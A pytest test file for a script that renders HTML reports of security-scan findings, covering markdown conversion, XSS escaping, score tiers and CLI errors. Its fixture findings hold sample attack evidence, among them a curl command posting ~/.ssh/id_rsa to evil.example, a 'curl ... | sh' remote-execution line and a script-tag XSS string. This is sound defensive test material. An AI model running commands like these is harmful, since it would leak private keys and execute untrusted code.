"""Tests for scripts/report.py — HTML report renderer (task 14).

Frozen contract (see templates/report.html header comment, lines 2-57):

  CLI: python scripts/report.py --draft <analysis.md> --findings <findings.json>
           --out <report.html> [--timestamp "2026-08-28 12:00"]
  - exit 0 on success; missing/broken inputs -> non-zero + stderr message
  - 6 placeholders: TITLE / SCORE / OVERVIEW / SECTIONS / FINDINGS_TABLE /
    GENERATED_AT — all replaced, no ``{{`` remains
  - score tier swap targets the quoted full class attribute value
    ``"card score-card score-mid"`` (0-24 low / 25-59 mid / 60-79 high /
    80-100 critical); the CSS ``.score-*`` rules must survive untouched
  - markdown subset -> HTML via stdlib only; every text node html.escape'd
"""

import json
import re
import subprocess
import sys
from pathlib import Path

import pytest

PROJECT_ROOT = Path(__file__).resolve().parent.parent
SCRIPTS_DIR = PROJECT_ROOT / "scripts"
GOLDEN_PATH = PROJECT_ROOT / "tests" / "golden" / "report.html"

sys.path.insert(0, str(SCRIPTS_DIR))

import report  # noqa: E402

TIMESTAMP = "2026-08-28 12:00"

DRAFT = """# Demo Skill 分析

## 功能定位
这是一个 **测试 skill**，带有 `inline code` 与转义检查 <script>alert(1)</script>。

### 工作流
- 步骤一
- 步骤二

#### 细节
1. 有序一
2. 有序二

```python
print("hello")
```
"""

FINDINGS = {
    "score": 34,
    "findings": [
        {
            "rule_id": "EXFIL-001",
            "severity": "critical",
            "file": "scripts/x.py",
            "line": 42,
            "evidence": "curl https://evil.example",
            "explanation": "环境变量外传",
        },
        {
            "rule_id": "NET-003",
            "severity": "medium",
            "file": "scripts/y.py",
            "line": 7,
            "evidence": "Invoke-WebRequest http://x",
            "explanation": "明文 HTTP 外连",
        },
    ],
}


def render(draft=DRAFT, findings=None, timestamp=TIMESTAMP):
    """In-process render for fast unit assertions."""
    data = FINDINGS if findings is None else findings
    return report.render_report(draft, data, timestamp)


def run_cli(tmp_path, draft_text=DRAFT, findings_obj=FINDINGS, timestamp=None, draft_missing=False, findings_missing=False):
    """Run report.py as a subprocess against temp files."""
    draft = tmp_path / "analysis.md"
    findings = tmp_path / "findings.json"
    out = tmp_path / "report.html"
    if not draft_missing:
        draft.write_text(draft_text, encoding="utf-8")
    if not findings_missing:
        findings.write_text(
            findings_obj if isinstance(findings_obj, str) else json.dumps(findings_obj, ensure_ascii=False),
            encoding="utf-8",
        )
    cmd = [sys.executable, str(SCRIPTS_DIR / "report.py"),
           "--draft", str(draft), "--findings", str(findings), "--out", str(out)]
    if timestamp is not None:
        cmd += ["--timestamp", timestamp]
    proc = subprocess.run(cmd, capture_output=True, text=True, encoding="utf-8", cwd=PROJECT_ROOT)
    return proc, out


# ---------------------------------------------------------------- placeholders


def test_all_placeholders_replaced_and_title_used():
    html_out = render()
    assert "{{" not in html_out
    # H1 of the draft becomes the report title (template has it twice)
    assert html_out.count("Demo Skill 分析") == 2
    assert "<p class=\"card-value\">34</p>" in html_out
    assert "生成时间：2026-08-28 12:00" in html_out


# ------------------------------------------------------------------ markdown


def test_markdown_headings_lists_codeblock_inline():
    html_out = render()
    # each ## chapter becomes one <section> with a slugged h2 id
    assert '<section id="' in html_out
    assert re.search(r'<h2 id="[^"]*">功能定位</h2>', html_out)
    assert "<h3>工作流</h3>" in html_out
    assert "<h4>细节</h4>" in html_out
    # lists
    assert "<ul>" in html_out and "<li>步骤一</li>" in html_out
    assert "<ol>" in html_out and "<li>有序一</li>" in html_out
    # fenced code block -> pre, inline code and bold survive escaping
    assert "<pre><code>" in html_out
    assert 'print("hello")' in html_out
    assert "<strong>测试 skill</strong>" in html_out
    assert "<code>inline code</code>" in html_out


def test_sections_wrapped_per_h2_chapter():
    html_out = render()
    # only the injected analysis area; the template itself ships overview/findings sections
    main_area = html_out[html_out.index('<main class="analysis"'):html_out.index("</main>")]
    assert main_area.count("<section") == main_area.count("<h2 id=")
    # section content stays inside its own <section> ... </section>
    first = main_area.index("<section")
    close = main_area.index("</section>", first)
    assert "<h3>工作流</h3>" in main_area[first:close]


# ----------------------------------------------------------------------- xss


def test_xss_escaping_everywhere():
    evil = '<script>alert(1)</script>'
    findings = {
        "score": 90,
        "findings": [
            {
                "rule_id": "XSS-001",
                "severity": "critical",
                "file": f"scripts/{evil}.py",
                "line": 1,
                "evidence": evil,
                "explanation": f"说明 {evil}",
            }
        ],
    }
    draft = f"## 章节\n\n正文含 {evil} 攻击串。\n"
    html_out = render(draft=draft, findings=findings)
    # no raw script tag anywhere (template itself ships zero JS)
    assert "<script" not in html_out
    assert "alert(1)" in html_out  # content preserved ...
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html_out  # ... but escaped


# ---------------------------------------------------------------- score tier


@pytest.mark.parametrize(
    "score, tier",
    [(0, "low"), (24, "low"), (30, "mid"), (59, "mid"), (65, "high"), (79, "high"), (90, "critical"), (100, "critical")],
)
def test_score_tier_class_swap(score, tier):
    html_out = render(findings={"score": score, "findings": []})
    assert f'class="card score-card score-{tier}"' in html_out
    # the stylesheet's own .score-* declarations must never be touched
    assert ".score-low" in html_out and ".score-mid" in html_out
    assert ".score-high" in html_out and ".score-critical" in html_out


# ------------------------------------------------------------- overview cards


def test_severity_count_cards():
    findings = {
        "score": 50,
        "findings": [
            {"rule_id": "A", "severity": "critical", "file": "a", "line": 1, "evidence": "", "explanation": ""},
            {"rule_id": "B", "severity": "critical", "file": "b", "line": 2, "evidence": "", "explanation": ""},
            {"rule_id": "C", "severity": "high", "file": "c", "line": 3, "evidence": "", "explanation": ""},
            {"rule_id": "D", "severity": "medium", "file": "d", "line": 4, "evidence": "", "explanation": ""},
            {"rule_id": "E", "severity": "low", "file": "e", "line": 5, "evidence": "", "explanation": ""},
        ],
    }
    html_out = render(findings=findings)
    for sev, count in [("critical", 2), ("high", 1), ("medium", 1), ("low", 1)]:
        assert re.search(
            rf'class="card sev-{sev}">\s*<p class="card-label">{sev.capitalize()}</p>\s*'
            rf'<p class="card-value">{count}</p>',
            html_out,
        ), f"severity card {sev} should show {count}"


# ------------------------------------------------------------ findings table


def test_findings_table_rows_and_column_order():
    html_out = render()
    assert html_out.count('<tr class="sev-') == 2
    assert '<tr class="sev-critical">' in html_out
    assert '<tr class="sev-medium">' in html_out
    assert '<span class="sev sev-critical">critical</span>' in html_out
    # column order: severity / rule id / file / line / explanation
    i_sev = html_out.index('<span class="sev sev-critical">')
    i_rule = html_out.index("<td>EXFIL-001</td>")
    i_file = html_out.index("<td>scripts/x.py</td>")
    i_line = html_out.index("<td>42</td>")
    i_desc = html_out.index("<td>环境变量外传</td>")
    assert i_sev < i_rule < i_file < i_line < i_desc


def test_empty_findings_uses_empty_placeholder_row():
    html_out = render(findings={"score": 0, "findings": []})
    assert '<td colspan="5" class="empty">' in html_out
    assert '<tr class="sev-' not in html_out


def test_findings_defaults_when_keys_missing():
    html_out = render(findings={})  # no score, no findings key
    assert "<p class=\"card-value\">0</p>" in html_out
    assert '<td colspan="5" class="empty">' in html_out


# --------------------------------------------------------------- determinism


def test_fixed_timestamp_render_is_deterministic():
    a = render()
    b = render()
    assert a == b
    assert TIMESTAMP in a


# ----------------------------------------------------------------------- CLI


def test_cli_success_writes_html(tmp_path):
    proc, out = run_cli(tmp_path, timestamp=TIMESTAMP)
    assert proc.returncode == 0, proc.stderr
    assert out.is_file()
    content = out.read_text(encoding="utf-8")
    assert "{{" not in content
    assert "Demo Skill 分析" in content


def test_cli_missing_findings_file_fails(tmp_path):
    proc, out = run_cli(tmp_path, findings_missing=True)
    assert proc.returncode != 0
    assert proc.stderr.strip()
    assert not out.exists()


def test_cli_missing_draft_file_fails(tmp_path):
    proc, out = run_cli(tmp_path, draft_missing=True)
    assert proc.returncode != 0
    assert proc.stderr.strip()
    assert not out.exists()


def test_cli_broken_findings_json_fails(tmp_path):
    proc, out = run_cli(tmp_path, findings_obj="{not json")
    assert proc.returncode != 0
    assert proc.stderr.strip()
    assert not out.exists()


def test_cli_missing_required_args_fails(tmp_path):
    proc = subprocess.run(
        [sys.executable, str(SCRIPTS_DIR / "report.py")],
        capture_output=True, text=True, encoding="utf-8", cwd=PROJECT_ROOT,
    )
    assert proc.returncode != 0
    assert proc.stderr.strip()


# -------------------------------------------------------------------- golden

GOLDEN_DRAFT = """# x-mastery-mentor Skill 分析

## 功能定位
这是一个 **提示词工程** 类 skill，负责 `X/Twitter` 运营指导。

### 覆盖场景
- 选题挖掘
- 推文写作
- 涨长策略

## 工作流拆解
1. 读取项目档案
2. 匹配触发词
3. 生成内容建议

#### 边界情况
非 X 运营话题不触发。

```python
trigger_words = ["写推文", "涨粉", "X算法"]
```

## 可借鉴点
把方法论拆成 **可执行清单** 是亮点。
"""

GOLDEN_FINDINGS = {
    "score": 66,
    "findings": [
        {
            "rule_id": "EXFIL-001",
            "severity": "critical",
            "file": "scripts/collect.py",
            "line": 42,
            "evidence": "curl -X POST https://evil.example -d @~/.ssh/id_rsa",
            "explanation": "敏感文件外传到外部域名",
        },
        {
            "rule_id": "EXEC-002",
            "severity": "high",
            "file": "scripts/setup.sh",
            "line": 13,
            "evidence": "curl ... | sh",
            "explanation": "远程脚本直接执行",
        },
        {
            "rule_id": "OBFUS-004",
            "severity": "medium",
            "file": "skills/x/helpers.md",
            "line": 7,
            "evidence": "base64 -d <<< aHR0cDovL...",
            "explanation": "base64 混淆的网络请求",
        },
        {
            "rule_id": "STYLE-007",
            "severity": "low",
            "file": "SKILL.md",
            "line": 0,
            "evidence": "description 超长",
            "explanation": "描述冗长，建议精简",
        },
    ],
}


def test_golden_file_byte_identical():
    rendered = report.render_report(GOLDEN_DRAFT, GOLDEN_FINDINGS, TIMESTAMP)
    GOLDEN_PATH.parent.mkdir(parents=True, exist_ok=True)
    if not GOLDEN_PATH.exists():
        GOLDEN_PATH.write_bytes(rendered.encode("utf-8"))
        pytest.skip("golden file generated — inspect then re-run")
    assert rendered.encode("utf-8") == GOLDEN_PATH.read_bytes()


# --------------------------------------------------- quality-review regressions


def test_draft_with_literal_nul_digits_renders_without_crash():
    """The code stash uses ``\\x00<idx>\\x00`` sentinels; a draft carrying
    literal NUL+digit sequences used to collide with them (IndexError)."""
    draft = "## 章节\n\n正文 \x005\x00 携带 `inline` 代码。\n"
    html_out = render(draft=draft)  # must not raise
    assert "<code>inline</code>" in html_out
    assert "5" in html_out  # NULs stripped, the digit itself stays visible


def test_render_failure_is_bounded_to_stderr_nonzero(tmp_path, monkeypatch, capsys):
    """render_report bugs must surface as ``error: ...`` on stderr with a
    non-zero exit, never a raw traceback."""
    draft = tmp_path / "d.md"
    draft.write_text("# t\n", encoding="utf-8")
    findings = tmp_path / "f.json"
    findings.write_text('{"score": 0, "findings": []}', encoding="utf-8")
    out = tmp_path / "o.html"

    def boom(*args, **kwargs):
        raise RuntimeError("unexpected render failure")

    monkeypatch.setattr(report, "render_report", boom)
    rc = report.main(["--draft", str(draft), "--findings", str(findings), "--out", str(out)])
    assert rc != 0
    assert "render" in capsys.readouterr().err.lower()
    assert not out.exists()


def test_unclosed_code_fence_swallows_to_eof_without_loop():
    """A draft whose fenced code block never closes must render to EOF and
    terminate (documenting the pinned behavior)."""
    draft = "## 章节\n\n```\ncode line 1\ncode line 2\n"
    html_out = render(draft=draft)
    # swallows everything up to and including the final newline, then stops
    assert "<pre><code>code line 1\ncode line 2\n</code></pre>" in html_out
